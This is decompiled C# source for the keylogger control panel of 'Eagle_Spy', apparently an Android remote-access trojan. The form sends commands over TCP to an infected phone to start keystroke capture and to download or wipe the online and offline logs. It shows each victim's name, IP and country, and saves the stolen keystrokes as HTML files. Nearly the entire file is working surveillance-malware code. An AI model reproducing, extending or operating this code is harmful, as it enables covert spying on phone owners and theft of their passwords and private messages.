using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000075 RID: 117
	[DesignerGenerated]
	public partial class Keylogger : Form
	{
		// Token: 0x060006D3 RID: 1747 RVA: 0x000B964C File Offset: 0x000B784C
		public void CraxsStyle()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) == 0)
				{
					this.getbtn.Text = "得到";
					this.delbtn.Text = "删除";
					this.savedbtn.Text = "已下载";
					this.backallbtn.Text = "全部下载";
					this.deleteallbtn.Text = "删除所有";
					this.keytabs.TabPages[0].Text = "在线的";
					this.keytabs.TabPages[1].Text = "离线";
					return;
				}
			}
			else
			{
				this.getbtn.Text = "تحميل السجل";
				this.delbtn.Text = "حذف السجل";
				this.savedbtn.Text = "تم تنزيله";
				this.backallbtn.Text = "تحميل الكل";
				this.deleteallbtn.Text = "حذف الكل";
				this.keytabs.TabPages[0].Text = "مباشر";
				this.keytabs.TabPages[1].Text = "مسجل";
			}
		}

		// Token: 0x060006D4 RID: 1748 RVA: 0x000B9790 File Offset: 0x000B7990
		public Keylogger()
		{
			base.Load += this.Keylogger_Load;
			base.Closing += this.Keylogger_Closing;
			this.combologs = new DrakeUIComboBox();
			this.Title = "null";
			this.IsActive = false;
			this.searchbefore = new List<DataGridViewRow>();
			this.lastFoundIndex = -1;
			this.InitializeComponent();
			this.Font = reso.f;
			this.CraxsStyle();
		}

		// Token: 0x060006D5 RID: 1749 RVA: 0x00002423 File Offset: 0x00000623
		private void SpyStyle()
		{
		}

		// Token: 0x060006D6 RID: 1750 RVA: 0x000044BB File Offset: 0x000026BB
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x060006D7 RID: 1751 RVA: 0x000B9810 File Offset: 0x000B7A10
		private void Keylogger_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
			this.DGV0.DefaultCellStyle.Font = reso.f;
			this.DGV0.ContextMenuStrip = this.ctxMenu;
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\19.ico");
			try
			{
				this.ClientPic.Image = this.classClient.Wallpaper;
				this.clinameinfo.Text = string.Concat(new string[]
				{
					"Name: ",
					this.classClient.ClientName,
					Strings.Space(2),
					"IP: ",
					this.classClient.ClientAddressIP,
					Strings.Space(2),
					"Country: ",
					this.classClient.Country
				});
			}
			catch (Exception)
			{
			}
			this.Text = this.Title;
			this.SaveToolStripMenuItem.Visible = true;
			this.SaveAsToolStripMenuItem.Visible = true;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
			if (this.classClient != null)
			{
				TcpClient myClient = this.classClient.myClient;
				object[] array = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient8,
						Data.SPL_SOCKET,
						SecurityKey.Keylogger,
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						"(unknown)"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x060006D8 RID: 1752 RVA: 0x000B99DC File Offset: 0x000B7BDC
		private void getbtn_click(object sender, EventArgs e)
		{
			if (!this.IsActive)
			{
				EagleAlert.Showinformation("Accessibilty Not Enabled.");
				return;
			}
			if ((this.combologs.Text.Length < 1) | (this.combologs.Text == null))
			{
				Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
				return;
			}
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"rd<*>",
							this.combologs.Text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
					this.loadinglogs.Enabled = true;
					this.loadinglogs.Visible = true;
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060006D9 RID: 1753 RVA: 0x000B9B78 File Offset: 0x000B7D78
		private void Button2_Click(object sender, EventArgs e)
		{
			if (!this.IsActive)
			{
				Interaction.MsgBox("Accessibilty Not Enabled.", MsgBoxStyle.OkOnly, null);
				return;
			}
			if ((this.combologs.Text.Length < 1) | (this.combologs.Text == null))
			{
				Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
				return;
			}
			if (MessageBox.Show("Log will deleted completely ,\r\nAccept ?", "Keylogger", MessageBoxButtons.YesNo) == DialogResult.Yes && this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(SecurityKey.KeysClient2 + Data.SPL_SOCKET + "rdd<*>", Codes.BSEN(this.combologs.Text)), Data.SPL_SOCKET), array[0]), Data.SPL_SOCKET), array[1]), Data.SPL_SOCKET), SecurityKey.Lockscreen), Data.SPL_SOCKET), Conversions.ToString(0)), Data.SPL_SOCKET), Conversions.ToString(0)), Data.SPL_SOCKET), Data.SPL_ARRAY), Data.SPL_SOCKET), this.classClient.ClientRemoteAddress),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
					this.combologs.Text = "";
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060006DA RID: 1754 RVA: 0x000B9D30 File Offset: 0x000B7F30
		public void Done(object[] objs)
		{
			if (this.offlinetext.InvokeRequired)
			{
				Keylogger.OffLOG offLOG = new Keylogger.OffLOG(this.Done);
				this.offlinetext.Invoke(offLOG, new object[] { objs });
				return;
			}
			this.offlinetext.AppendText(Conversions.ToString(objs[0]));
			this.offlinetext.SelectionStart = Strings.Len(this.offlinetext.Text);
			this.offlinetext.ScrollToCaret();
			this.offlinetext.Select();
		}

		// Token: 0x060006DB RID: 1755 RVA: 0x000B9DB4 File Offset: 0x000B7FB4
		public void cleait()
		{
			if (this.offlinetext.InvokeRequired)
			{
				Keylogger.clearold clearold = new Keylogger.clearold(this.cleait);
				this.offlinetext.Invoke(clearold, new object[0]);
				return;
			}
			this.loadinglogs.Enabled = false;
			this.loadinglogs.Visible = false;
			this.offlinetext.Clear();
		}

		// Token: 0x060006DC RID: 1756 RVA: 0x000B9E14 File Offset: 0x000B8014
		private void Button3_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.classClient.FolderUSER + "\\OFFLINE_KEYLOGS"))
				{
					Directory.CreateDirectory(this.classClient.FolderUSER + "\\OFFLINE_KEYLOGS");
				}
				Process.Start(this.classClient.FolderUSER + "\\OFFLINE_KEYLOGS");
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060006DD RID: 1757 RVA: 0x000B9E88 File Offset: 0x000B8088
		private void Delbtn_Click(object sender, EventArgs e)
		{
			if (!this.IsActive)
			{
				Interaction.MsgBox("Accessibilty Not Enabled.", MsgBoxStyle.OkOnly, null);
				return;
			}
			if ((this.combologs.Text.Length < 1) | (this.combologs.Text == null))
			{
				Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
				return;
			}
			if (this.classClient == null)
			{
				return;
			}
			try
			{
				try
				{
					string text = "this record will be removed completely from the phone , continue ?";
					string language = RegistryHandler.Get_Language();
					if (Operators.CompareString(language, "AR", false) != 0)
					{
						if (Operators.CompareString(language, "CN", false) == 0)
						{
							text = "这条记录将从手机中彻底删除，继续吗？";
						}
					}
					else
					{
						text = "سيتم حذف هذا السجل بالكامل من الهاتف ، هل تريد المتابعة؟";
					}
					if (MessageBox.Show(text, "Keylogger", MessageBoxButtons.YesNo) != DialogResult.Yes)
					{
						return;
					}
				}
				catch (Exception)
				{
				}
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"rdd<*>",
						this.combologs.Text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
				this.combologs.Items.Remove(this.combologs.Text);
				this.combologs.Text = "";
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060006DE RID: 1758 RVA: 0x000BA0A0 File Offset: 0x000B82A0
		private void Button3_Click_1(object sender, EventArgs e)
		{
			if (this.classClient == null)
			{
				return;
			}
			try
			{
				try
				{
					string text = "All record will be removed completely from the phone , continue ?";
					string language = RegistryHandler.Get_Language();
					if (Operators.CompareString(language, "AR", false) != 0)
					{
						if (Operators.CompareString(language, "CN", false) == 0)
						{
							text = "所有记录将从手机中完全删除，继续吗？";
						}
					}
					else
					{
						text = "سيتم حذف جميع السجل بالكامل من الهاتف ، هل تريد المتابعة؟";
					}
					if (MessageBox.Show(text, "Keylogger", MessageBoxButtons.YesNo) != DialogResult.Yes)
					{
						return;
					}
				}
				catch (Exception)
				{
				}
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"rdall<*>r",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
				this.combologs.Items.Clear();
				this.combologs.Text = "";
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060006DF RID: 1759 RVA: 0x000BA258 File Offset: 0x000B8458
		private void Backallbtn_Click(object sender, EventArgs e)
		{
			if (this.combologs.Items.Count < 1)
			{
				Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
				return;
			}
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"rdall<*>g",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060006E0 RID: 1760 RVA: 0x000BA39C File Offset: 0x000B859C
		private void Searchbtn_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.offlinetext.Text))
			{
				EagleAlert.Showinformation("No Data Found");
				return;
			}
			if (string.IsNullOrEmpty(this.searchtext.Text))
			{
				EagleAlert.Showinformation("Enter Text to search First");
				return;
			}
			bool flag = true;
			string text = this.searchtext.Text;
			string text2 = this.offlinetext.Text;
			int num = text2.IndexOf(text, StringComparison.CurrentCultureIgnoreCase);
			if (num >= 0 && this.lastFoundIndex == num && this.lastFoundIndex < num)
			{
				this.lastFoundIndex = num;
				this.offlinetext.Select(num, text.Length);
				this.offlinetext.SelectionColor = Color.White;
				this.offlinetext.ScrollToCaret();
				flag = false;
			}
			if (flag)
			{
				EagleAlert.Showinformation("No Result Found");
			}
		}

		// Token: 0x060006E1 RID: 1761 RVA: 0x000044F1 File Offset: 0x000026F1
		private void Clearsrchbtn_Click(object sender, EventArgs e)
		{
			this.searchtext.Text = "";
			this.offlinetext.SelectAll();
			this.offlinetext.SelectionColor = Color.Black;
			this.offlinetext.SelectionStart = 0;
			this.lastFoundIndex = -1;
		}

		// Token: 0x060006E2 RID: 1762 RVA: 0x00004531 File Offset: 0x00002731
		private void Searchtext_TextChanged(object sender, EventArgs e)
		{
			this.searchbefore.Clear();
			if (!string.IsNullOrEmpty(this.searchtext.Text))
			{
				this.clearsrchbtn.Visible = true;
				return;
			}
			this.clearsrchbtn.Visible = false;
		}

		// Token: 0x060006E3 RID: 1763 RVA: 0x000BA460 File Offset: 0x000B8660
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				TcpClient myClient = this.classClient.myClient;
				object[] array = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient8,
						Data.SPL_SOCKET,
						SecurityKey.Keylogger,
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						"(unknown)"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x060006E4 RID: 1764 RVA: 0x000BA4FC File Offset: 0x000B86FC
		private void Exitbtn_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				this.classClient.Keylogg = false;
				object[] array = new object[]
				{
					this.Client,
					SecurityKey.KeysClient9 + Data.SPL_SOCKET + SecurityKey.Keylogger,
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x060006E5 RID: 1765 RVA: 0x000BA4FC File Offset: 0x000B86FC
		private void Keylogger_Closing(object sender, CancelEventArgs e)
		{
			if (this.classClient != null)
			{
				this.classClient.Keylogg = false;
				object[] array = new object[]
				{
					this.Client,
					SecurityKey.KeysClient9 + Data.SPL_SOCKET + SecurityKey.Keylogger,
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x060006E6 RID: 1766 RVA: 0x000BA56C File Offset: 0x000B876C
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			reso.Directory_Exist(this.classClient);
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				reso.SAVEit((Array)a0);
			}, new object[]
			{
				this.DGV0,
				this.tmpFolderUSER,
				"Keylogger",
				this.tmpClientName,
				this.tmpCountry + " - " + this.tmpAddressIP,
				"Keylogger",
				"log",
				DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
			});
		}

		// Token: 0x060006E7 RID: 1767 RVA: 0x000BA61C File Offset: 0x000B881C
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					reso.SAVEit((Array)a0);
				}, new object[]
				{
					this.DGV0,
					"null",
					saveFileDialog.FileName,
					this.tmpClientName,
					this.tmpCountry + " - " + this.tmpAddressIP,
					"Keylogger",
					"log",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x060006E8 RID: 1768 RVA: 0x000BA6EC File Offset: 0x000B88EC
		private void button1_Click(object sender, EventArgs e)
		{
			if (!this.IsActive)
			{
				Interaction.MsgBox("Accessibilty Not Enabled.", MsgBoxStyle.OkOnly, null);
				return;
			}
			if ((this.combologs.Text.Length < 1) | (this.combologs.Text == null))
			{
				Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
				return;
			}
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"rd<*>",
							this.combologs.Text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
					this.loadinglogs.Enabled = true;
					this.loadinglogs.Visible = true;
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060006E9 RID: 1769
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x060006EA RID: 1770
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x060006EB RID: 1771 RVA: 0x00004569 File Offset: 0x00002769
		private void clinameinfo_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Keylogger.ReleaseCapture();
				Keylogger.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060006EC RID: 1772 RVA: 0x00002423 File Offset: 0x00000623
		private void DGV0_CellContentClick(object sender, DataGridViewCellEventArgs e)
		{
		}

		// Token: 0x060006ED RID: 1773 RVA: 0x000BA88C File Offset: 0x000B8A8C
		private void UpdateEnglish()
		{
			this.TabPage3.Text = "Online Keylogger";
			this.TabPage4.Text = "Offline keylogger";
			this.button1.Text = "GET";
			this.searchtext.Text = "Search Offline Keylogger";
		}

		// Token: 0x060006EE RID: 1774 RVA: 0x000BA8DC File Offset: 0x000B8ADC
		private void UpdateChinese()
		{
			this.TabPage3.Text = "在线键盘记录器";
			this.TabPage4.Text = "离线键盘记录器";
			this.button1.Text = "获取";
			this.searchtext.Text = "搜索离线键盘记录器";
		}

		// Token: 0x060006EF RID: 1775 RVA: 0x000BA92C File Offset: 0x000B8B2C
		private void UpdateRussian()
		{
			this.TabPage3.Text = "Онлайн Кейлоггер";
			this.TabPage4.Text = "Офлайн Кейлоггер";
			this.button1.Text = "ПОЛУЧИТЬ";
			this.searchtext.Text = "Поиск офлайн Кейлоггера";
		}

		// Token: 0x060006F0 RID: 1776 RVA: 0x000BA97C File Offset: 0x000B8B7C
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x0400080C RID: 2060
		public TcpClient Client;

		// Token: 0x0400080D RID: 2061
		public Client classClient;

		// Token: 0x0400080E RID: 2062
		public string Title;

		// Token: 0x0400080F RID: 2063
		public bool IsActive;

		// Token: 0x04000810 RID: 2064
		public string tmpFolderUSER;

		// Token: 0x04000811 RID: 2065
		public string tmpClientName;

		// Token: 0x04000812 RID: 2066
		public string tmpCountry;

		// Token: 0x04000813 RID: 2067
		public string tmpAddressIP;

		// Token: 0x04000814 RID: 2068
		private List<DataGridViewRow> searchbefore;

		// Token: 0x04000815 RID: 2069
		private int lastFoundIndex;

		// Token: 0x02000076 RID: 118
		// (Invoke) Token: 0x060006F2 RID: 1778
		public delegate void OffLOG(object[] objs);

		// Token: 0x02000077 RID: 119
		// (Invoke) Token: 0x060006F6 RID: 1782
		public delegate void clearold();
	}
}
